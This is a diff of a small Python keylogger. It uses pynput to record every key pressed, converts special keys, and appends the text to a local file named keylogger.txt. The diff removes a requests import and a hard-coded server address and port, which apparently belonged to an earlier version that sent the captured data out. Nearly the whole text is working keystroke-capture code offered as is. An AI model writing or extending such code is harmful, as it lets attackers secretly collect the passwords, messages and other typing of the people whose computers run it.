@@ -1,35 +1,38 @@
 # listener class, monitor keyboard 
 from pynput.keyboard import Listener 
-import requests
-
-server = "http://192.168.0.199"
-port = 4444
 
 def writetofile(key):
 
-	keystroke= str(key)
-	keystroke = keystroke.replace("'", "")
+	try:
 
-	keys_to_discard = [
-		"Key.esc", "Key.ctrl", "Key.alt",
-		"Key.shift", "Key.caps_lock", "Key.backspace",
-		"Key.tab", "Key.right"
-	]
+		keystroke= str(key)
+		keystroke = keystroke.replace("'", "")
 
-	if keystroke == "Key.space":
+		keys_to_discard = [
+			"Key.esc", "Key.ctrl", "Key.alt",
+			"Key.shift", "Key.caps_lock", "Key.backspace",
+			"Key.tab", "Key.right"
+		]
 
-			keystroke = ' '
+		if keystroke == "Key.space":
+
+				keystroke = ' '
+		
+		if keystroke == "Key.enter":
+
+				keystroke = '\n'
+		
+		if keystroke in keys_to_discard:
+				
+				keystroke = ''
+
+		with open("keylogger.txt", 'a') as f:
 	
-	if keystroke == "Key.enter":
+			f.write(keystroke)
 
-			keystroke = '\n'
-	
-	if keystroke in keys_to_discard:
-			
-			keystroke = ''
+	except FileNotFoundError:
 
-	with open("keylogger.txt", 'a') as f:
-		f.write(keystroke)
+		print("File could not be found, make sure the file is present in the working directory")
  
 # on_press argument makes the function execute everytime
 
